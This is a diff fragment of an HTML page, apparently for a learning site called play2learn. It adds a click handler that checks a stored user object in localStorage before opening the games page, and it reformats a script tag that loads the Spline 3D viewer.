+          gamesLink.style.cursor = "pointer"; // Keep the pointer cursor
 
+          // Add click event listener
+          gamesLink.addEventListener("click", (e) => {
+            e.preventDefault();
 
+            // Check if user is logged in
+            const currentUser = JSON.parse(
+              localStorage.getItem("play2learn_current_user")
+            );
 
-    <script type="module" src="https://unpkg.com/@splinetool/viewer@1.9.82/build/spline-viewer.js"></script>
-    
+            if (currentUser && currentUser.isLoggedIn) {
+              // User is logged in, navigate to games
+              window.location.href = "/games";
+            } else {
+              // User is not logged in, show login modal
+
+              // Show message that login is required
+              alert("Please login or SignUp to continue");
+            }
+          });
+        }
+      });
+    </script>
+
+    <script
+      type="module"
+      src="https://unpkg.com/@splinetool/viewer@1.9.82/build/spline-viewer.js"
+    ></script>
   </body>
 </html>
